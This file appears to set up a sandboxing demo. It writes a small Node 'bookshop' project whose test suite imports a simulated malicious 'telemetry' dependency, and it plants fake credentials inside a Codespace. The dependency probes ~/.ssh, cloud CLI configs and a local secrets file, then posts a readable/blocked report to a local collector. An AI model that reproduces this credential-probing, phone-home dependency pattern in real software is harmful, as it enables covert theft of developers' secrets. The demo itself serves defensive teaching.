// The bookshop project shared by demo 4 (GitHub Copilot CLI) and demo 5 (Microsoft Copilot SDK).
// Its test suite loads a "telemetry" dependency that probes credential locations and phones home.
// The probe reports METADATA ONLY (readable or blocked), never file contents, so it is safe to run
// on a real laptop. Fake credentials are planted in the real home folder only inside a Codespace.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { c } from './common.mjs';

export const IN_CODESPACE = process.env.CODESPACES === 'true';

// In the dev container, npm is a symlink into this folder; sandboxed commands need it read-only.
export const DEVCONTAINER_NODE_MODULES = '/usr/local/lib/node_modules';

const FILES = {
  'package.json': JSON.stringify({
    name: 'bookshop', version: '1.0.0', private: true, type: 'module',
    scripts: { test: 'node --test' },
  }, null, 2) + '\n',
  'src/pricing.js': 'export const priceWithDiscount = (price) => Math.round(price * 0.9 * 100) / 100;\n',
  'test/pricing.test.js': [
    "import test from 'node:test';",
    "import assert from 'node:assert/strict';",
    "import '@acme/telemetry';",
    "import { priceWithDiscount } from '../src/pricing.js';",
    '',
    "test('applies the 10 % discount', () => assert.equal(priceWithDiscount(100), 90));",
    "test('keeps cents', () => assert.equal(priceWithDiscount(19.99), 17.99));",
    '',
  ].join('\n'),
  // SAP-style local service credentials (fake). Many CAP and approuter projects keep one locally.
  'default-env.json': JSON.stringify({
    VCAP_SERVICES: { aicore: [{ name: 'aicore', credentials: { clientid: 'DEMO-ONLY', clientsecret: 'DEMO-ONLY-fake-secret' } }] },
  }, null, 2) + '\n',
  'node_modules/@acme/telemetry/package.json': JSON.stringify({ name: '@acme/telemetry', version: '9.9.9', type: 'module', main: 'index.js' }, null, 2) + '\n',
  // Credential masking check: prints a short fingerprint of GH_TOKEN (never the value), then uses it.
  // Run it in a normal terminal and inside the Copilot sandbox: different fingerprints, same login.
  'whoami.sh': [
    '#!/bin/sh',
    'fp() { if command -v sha256sum >/dev/null 2>&1; then printf %s "$1" | sha256sum | cut -c1-8; else printf %s "$1" | shasum -a 256 | cut -c1-8; fi; }',
    'for V in GH_TOKEN GITHUB_TOKEN; do',
    '  T="$(printenv $V)"',
    '  if [ -n "$T" ]; then echo "$V seen by this command: fingerprint $(fp "$T") (${#T} characters)"',
    '  else echo "$V seen by this command: not set"; fi',
    'done',
    'gh api user --jq \'"gh api user: signed in as " + .login\' 2>&1 | head -n 2',
    '',
  ].join('\n'),
  'node_modules/@acme/telemetry/index.js': `// Simulated malicious dependency: probes credential locations, then "phones home".
// It reports only whether each location is readable. It never prints or sends contents.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const targets = [
  ['~/.ssh', path.join(os.homedir(), '.ssh')],
  ['~/.cf/config.json', path.join(os.homedir(), '.cf', 'config.json')],
  ['~/.azure', path.join(os.homedir(), '.azure')],
  ['./default-env.json', path.resolve('default-env.json')],
];
const report = [];
for (const [label, p] of targets) {
  try {
    if (fs.statSync(p).isDirectory()) fs.readdirSync(p); else fs.readFileSync(p);
    report.push(label + ' READABLE');
  } catch (e) {
    report.push(label + (e.code === 'ENOENT' ? ' not found' : ' BLOCKED (' + e.code + ')'));
  }
}
let upload;
try {
  const res = await fetch('http://127.0.0.1:9999/collect', { method: 'POST', body: report.join('\\n'), signal: AbortSignal.timeout(3000) });
  upload = 'SENT (' + res.status + ')';
} catch (e) {
  upload = 'NOT DELIVERED (' + (e.cause?.code ?? e.name) + ')';
}
console.error('[acme-telemetry] ' + report.join(' | ') + ' | upload to 127.0.0.1:9999 ' + upload);
`,
};

// Writes a fresh copy of the project to appDir (the parent folder is removed first).
export function writeBookshop(appDir) {
  fs.rmSync(path.dirname(appDir), { recursive: true, force: true });
  for (const [rel, body] of Object.entries(FILES)) {
    const p = path.join(appDir, rel);
    fs.mkdirSync(path.dirname(p), { recursive: true });
    fs.writeFileSync(p, body);
  }
}

// Inside a Codespace the home folder is disposable: plant fake credentials there.
export function plantCodespaceCredentials() {
  if (!IN_CODESPACE) return;
  const home = os.homedir();
  const plant = (rel, body) => {
    const p = path.join(home, rel);
    if (fs.existsSync(p)) return;
    fs.mkdirSync(path.dirname(p), { recursive: true });
    fs.writeFileSync(p, body, { mode: 0o600 });
    console.log(c.dim(`  planted fake ${rel}`));
  };
  plant('.ssh/id_ed25519', '-----BEGIN OPENSSH PRIVATE KEY-----\nDEMO-ONLY-NOT-A-REAL-KEY\n-----END OPENSSH PRIVATE KEY-----\n');
  plant('.cf/config.json', JSON.stringify({ AccessToken: 'bearer DEMO-ONLY-fake', RefreshToken: 'DEMO-ONLY-fake' }, null, 2) + '\n');
}
